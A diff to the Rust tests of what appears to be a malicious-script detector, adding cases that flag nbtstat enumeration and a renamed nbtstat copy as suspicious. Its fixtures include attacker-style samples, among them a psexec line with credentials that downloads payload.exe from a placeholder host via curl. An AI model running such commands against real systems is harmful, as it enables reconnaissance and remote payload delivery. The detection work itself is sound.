@@ -4478,6 +4478,48 @@ C:\Users\Public\rg.tmp query HKLM\Software\Microsoft\Windows\CurrentVersion\Run 
     }
 
     #[test]
+    fn nbtstat_emits_enumeration_trait() {
+        let report = analyze(br#"nbtstat -n"#, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Enumeration { enum_kind, command }
+                    if enum_kind == "nbtstat" && command == "nbtstat -n"
+            )),
+            "nbtstat enumeration was not surfaced: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn copied_nbtstat_alias_emits_enumeration_trait() {
+        let script = br#"copy C:\Windows\System32\nbtstat.exe C:\Users\Public\nb.tmp
+C:\Users\Public\nb.tmp -a target
+"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ManipulatedExec { target, .. }
+                    if target.eq_ignore_ascii_case(r#"C:\Users\Public\nb.tmp"#)
+            )),
+            "copied nbtstat alias was not surfaced: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Enumeration { enum_kind, command }
+                    if enum_kind == "nbtstat" && command == "nbtstat.exe -a target"
+            )),
+            "copied nbtstat enumeration was not surfaced: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn psexec_replays_remote_cmd_child() {
         let script = br#"psexec \\target.example -u admin -p pass cmd.exe /V:ON /c set U=https://psexec-wrapper.example/payload.exe&&curl -o payload.exe !U!"#;
         let report = analyze(script, &AnalyzeConfig::default());
